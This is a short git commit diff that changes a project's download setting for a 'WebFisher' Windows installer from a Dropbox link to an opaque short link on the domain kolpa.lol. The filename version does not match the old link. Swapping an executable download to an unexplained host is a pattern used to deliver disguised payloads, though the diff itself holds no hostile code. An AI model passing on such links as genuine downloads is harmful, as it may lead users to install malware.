51a308269d1db974c715220a1a4bbe4104d31e05
zlwar <meminm052@gmail.com>
2026-08-24 13:46:32 -0600

    Update DOWNLOAD_CONFIG URL for WebFisher setup

--- lib/constants.ts
+++ lib/constants.ts
@@ -1,4 +1,4 @@
 export const DOWNLOAD_CONFIG = {
-    url: "https://www.dropbox.com/scl/fi/1fuwnsxjwngyv36kuqjer/WebFisher-Setup-2.1.1.exe?rlkey=xopnonwtmvf4ei1nu7jllfm7i&st=fwjrm5vx&dl=1",
+    url: "https://kolpa.lol/d/eb56f6f8f319400598d4c38f0a82244f",
     filename: "Webfisher-Setup-1.2.5.exe"
 };
